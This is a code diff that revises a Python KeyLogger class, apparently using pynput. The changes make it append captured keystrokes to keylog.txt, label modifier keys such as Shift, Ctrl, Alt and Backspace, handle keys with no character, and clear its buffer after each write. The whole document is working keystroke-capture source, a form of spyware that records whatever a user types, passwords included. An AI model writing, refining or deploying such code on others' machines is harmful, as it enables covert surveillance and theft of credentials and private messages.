@@ -15,20 +15,34 @@ class KeyLogger:
         self.write_file()
 
     def write_file(self):
-        """Save the keys to a file named 'log.txt'"""
-        with open("keylog.txt", "w") as f:
+        """Append the keys to a file named 'keylog.txt'."""
+        with open("keylog.txt", "a") as f:  # Open in append mode
             for key in self.keys:
                 if isinstance(key, Key):
                     if key == Key.space:
-                        f.write("\n")
+                        f.write(" ")
                     elif key == Key.tab:
                         f.write("\t")
                     elif key == Key.enter:
                         f.write("\n")
+                    elif key == Key.backspace:
+                        f.write("[BACKSPACE]")
+                    elif key == Key.shift:
+                        f.write("[SHIFT]")
+                    elif key == Key.ctrl:
+                        f.write("[CTRL]")
+                    elif key == Key.alt:
+                        f.write("[ALT]")
                     else:
-                        f.write(f"[{key}]\n")
+                        f.write(f"[{key}]")
                 else:
-                    f.write(key.char)
+                    if key.char:
+                        f.write(key.char)
+                    else:
+                        f.write("[UNKNOWN]")
+
+        # Clear the keys after writing to the file
+        self.keys = []
 
     def on_release(self, key):
         if key == Key.esc:
